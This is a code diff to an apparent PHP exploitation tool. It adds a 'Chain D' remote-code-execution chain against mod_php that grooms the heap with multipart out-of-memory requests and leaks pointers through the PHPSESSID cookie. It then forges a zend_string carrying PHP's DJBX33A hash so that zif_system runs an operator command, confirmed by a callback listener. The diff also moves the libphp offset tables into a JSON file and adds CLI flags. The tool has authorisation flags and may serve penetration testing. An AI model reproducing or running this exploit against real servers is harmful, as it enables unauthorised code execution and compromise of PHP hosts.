@@ -31,8 +31,6 @@ from .exploit import (
     ExploitBudget,
     ExploitOptions,
     run_exploit,
-)
-from .exploit import (
     _build_callback_php,
     _exec_snippet,
     _shell_literal,
@@ -414,6 +412,10 @@ def _run_exploit(args: argparse.Namespace) -> int:
         _abort(
             f"chain {args.chain} requires --lfi-path (for example '/page.php?page=')"
         )
+    if args.chain == "D":
+        profiles = _load_chain_d_profiles(getattr(args, "chain_d_offsets", None))
+        if not profiles:
+            _abort("chain D requires offset profiles; provide --chain-d-offsets or ensure data/chain_d_offsets.json exists")
     if args.chain == "B" and not args.gadget:
         _abort(
             "chain B requires --gadget with an application-specific serialised "
@@ -496,7 +498,44 @@ def _run_exploit(args: argparse.Namespace) -> int:
         health_url=args.health_url,
         budget=budget,
     )
-    exploit_result = run_exploit(client, profile, store, options)
+    if args.chain == "D":
+        from .exploit import ExploitResult
+        canary = new_nonce("P2SEXPL")
+        listener = None
+        if args.callback_port is not None:
+            try:
+                listener = CallbackListener(
+                    port=args.callback_port,
+                    bind=args.callback_bind,
+                    callback_ip=args.callback_ip,
+                    expected_sources=list(args.callback_expect or []),
+                )
+                listener.start()
+            except Exception:
+                listener = None
+        dr = _try_chain_d_rce(
+            client, profile, store,
+            args.command, listener, canary, args.timeout,
+            chain_d_offsets_path=getattr(args, "chain_d_offsets", None),
+        )
+        if listener:
+            listener.stop()
+        exploit_result = ExploitResult(
+            chain="D",
+            cve=args.cve or CVE_618,
+            scenario_id="chain-d-exploit",
+            success=dr["success"],
+            rce_confirmed=dr["success"],
+            command_output=dr.get("output"),
+            callback_received=dr["callback_received"],
+            notes=dr["notes"],
+            request_refs=dr.get("request_refs", []),
+            started_at=utcnow(),
+            finished_at=utcnow(),
+            budget=budget.to_dict(),
+        )
+    else:
+        exploit_result = run_exploit(client, profile, store, options)
 
     runs: List[ScenarioRun] = []
     if exploit_result.scenario_run is not None:
@@ -741,23 +780,24 @@ def _try_log_poison_rce(
 # Chain D: pure OOM mod_php exploit (no LFI required)
 # ---------------------------------------------------------------------------
 
-# Offset profiles: per PHP build + arch.
-# Keys: zval_ptr_dtor (offset in libphp.so), zif_system (offset in libphp.so),
-#        fake_array_S (offset in main chunk), hsv (heap slot vector in main chunk).
-CHAIN_D_PROFILES: Dict[str, Dict[str, int]] = {
-    "8.4.26-apache-trixie-x86_64": {
-        "zval_ptr_dtor": 0x34FA10,
-        "zif_system": 0x388600,
-        "fake_array_S": 0xF8398,
-        "hsv": 0x7D720,
-    },
-    "8.4.26-apache-trixie-aarch64": {
-        "zval_ptr_dtor": 0x2D2270,
-        "zif_system": 0x2FC138,
-        "fake_array_S": 0xF8398,
-        "hsv": 0x7D720,
-    },
-}
+_BUNDLED_OFFSETS = os.path.join(os.path.dirname(__file__), os.pardir, "data", "chain_d_offsets.json")
+
+
+def _load_chain_d_profiles(custom_path: Optional[str] = None) -> Dict[str, Dict[str, int]]:
+    """Load Chain D offset profiles from JSON (custom file or bundled default)."""
+    path = custom_path or _BUNDLED_OFFSETS
+    path = os.path.normpath(path)
+    if not os.path.isfile(path):
+        return {}
+    with open(path) as f:
+        data = json.load(f)
+    profiles: Dict[str, Dict[str, int]] = {}
+    for key, offsets in data.get("profiles", {}).items():
+        profiles[key] = {
+            k: int(v, 16) if isinstance(v, str) else v
+            for k, v in offsets.items()
+        }
+    return profiles
 
 
 def _parse_heap_leak(raw_cookie: bytes) -> Optional[Dict[str, Any]]:
@@ -814,6 +854,14 @@ def _parse_heap_leak(raw_cookie: bytes) -> Optional[Dict[str, Any]]:
         "pointer_count": len(ptrs),
         "unique_bases": len(bases_2m),
     }
+
+
+def _djbx33a(data: bytes) -> int:
+    """PHP's DJBX33A hash (zend_inline_hash_func)."""
+    h = 5381
+    for b in data:
+        h = ((h * 33) + b) & 0xFFFFFFFFFFFFFFFF
+    return h
 
 
 def _build_chain_d_payload(
@@ -877,7 +925,7 @@ def _build_chain_d_payload(
     zstr = bytearray(24 + len(cmd_bytes))
     struct.pack_into("<I", zstr, 0, 1)                # gc.refcount
     struct.pack_into("<I", zstr, 4, 6)                # type_info: IS_STRING
-    struct.pack_into("<Q", zstr, 8, hash(command) & 0xFFFFFFFFFFFFFFFF)  # h
+    struct.pack_into("<Q", zstr, 8, _djbx33a(cmd_bytes[:-1]))  # h (PHP hash)
     struct.pack_into("<Q", zstr, 16, len(cmd_bytes) - 1)  # len (without NUL)
     zstr[24:24 + len(cmd_bytes)] = cmd_bytes
 
@@ -893,6 +941,7 @@ def _try_chain_d_rce(
     canary_nonce: str,
     timeout: float = 30.0,
     workers: int = 5,
+    chain_d_offsets_path: Optional[str] = None,
 ) -> Dict[str, Any]:
     """Try Chain D: pure OOM exploitation on mod_php (no LFI needed).
 
@@ -916,18 +965,19 @@ def _try_chain_d_rce(
     boundary = "C" * 10
 
     # --- Detect offset profile ---
+    chain_d_profiles = _load_chain_d_profiles(chain_d_offsets_path)
     php_version = getattr(profile, "php_version", None)
     arch = "x86_64"  # default; could detect from phpinfo
     profile_key = None
     offsets = None
-    for key, offs in CHAIN_D_PROFILES.items():
+    for key, offs in chain_d_profiles.items():
         if php_version and php_version in key:
             profile_key = key
             offsets = offs
             break
 
     if not offsets:
-        for key, offs in CHAIN_D_PROFILES.items():
+        for key, offs in chain_d_profiles.items():
             if "x86_64" in key:
                 profile_key = key
                 offsets = offs
@@ -954,7 +1004,7 @@ def _try_chain_d_rce(
         a1_body = build_oom_probe_body()
         headers = {
             "Content-Type": f"multipart/form-data; boundary={boundary}",
-            "Cookie": "PHPSESSID=AAAA",
+            "Cookie": f"PHPSESSID={'A' * 26}",
         }
         try:
             a1_exchange = client.request(
@@ -979,7 +1029,7 @@ def _try_chain_d_rce(
         # --- B1: read back heap leak via PHPSESSID cookie ---
         result["notes"].append("B1: reading heap leak")
         b1_headers = {
-            "Cookie": "PHPSESSID=AAAA",
+            "Cookie": f"PHPSESSID={'A' * 26}",
         }
         try:
             b1_exchange = client.request(
@@ -1054,7 +1104,7 @@ def _try_chain_d_rce(
         a2_body = build_oom_lite_body(parts=100, depth=16)
         a2_headers = {
             "Content-Type": f"multipart/form-data; boundary={boundary}",
-            "Cookie": f"PHPSESSID={raw_session}",
+            "Cookie": f"PHPSESSID={urllib.parse.quote(raw_session, safe='')}",
         }
         try:
             a2_exchange = client.request(
@@ -1098,7 +1148,7 @@ def _try_chain_d_rce(
 
         b2_headers = {
             "Content-Type": f"multipart/form-data; boundary={b2_boundary}",
-            "Cookie": f"PHPSESSID={raw_session}",
+            "Cookie": f"PHPSESSID={urllib.parse.quote(raw_session, safe='')}",
         }
         try:
             b2_exchange = client.request(
@@ -1376,6 +1426,7 @@ def _run_auto(args: argparse.Namespace) -> int:
             dr = _try_chain_d_rce(
                 client, profile, store,
                 args.command, listener, canary, args.timeout,
+                chain_d_offsets_path=getattr(args, "chain_d_offsets", None),
             )
             chain_entry = {
                 "chain": "D",
@@ -1705,8 +1756,8 @@ examples:
     exploit = sub.add_parser("exploit", help="exploit chains with RCE verification (requires --ack-authorised)")
     exploit.add_argument("target")
     common(exploit)
-    exploit.add_argument("--chain", default="A", choices=("A", "B", "C"),
-                         help="exploit chain: A=session+LFI, B=gadget deser, C=direct callback")
+    exploit.add_argument("--chain", default="A", choices=("A", "B", "C", "D"),
+                         help="exploit chain: A=session+LFI, B=gadget deser, C=direct callback, D=pure OOM mod_php")
     exploit.add_argument("--cve", choices=(CVE_618, CVE_619),
                          help="CVE label for the run (default: chain-specific)")
     exploit.add_argument("--ack-authorised", action="store_true",
@@ -1750,6 +1801,8 @@ examples:
     exploit.add_argument("--health-url", help="health check URL (default: target base URL)")
     exploit.add_argument("--allow-remote", action="store_true",
                          help="allow exploit payloads against a globally routable host")
+    exploit.add_argument("--chain-d-offsets", metavar="FILE",
+                         help="JSON file with Chain D offset profiles (default: bundled data/chain_d_offsets.json)")
 
     auto = sub.add_parser("auto", help="discover prerequisites and try all viable chains")
     auto.add_argument("target")
@@ -1793,6 +1846,8 @@ examples:
                       help="chain B only: nonce embedded in the operator's gadget")
     auto.add_argument("--skip-discovery", action="store_true",
                       help="skip discovery phases; requires --lfi-path")
+    auto.add_argument("--chain-d-offsets", metavar="FILE",
+                      help="JSON file with Chain D offset profiles (default: bundled data/chain_d_offsets.json)")
 
     report = sub.add_parser("report", help="rebuild findings from stored evidence (no network)")
     report.add_argument("evidence_dir")
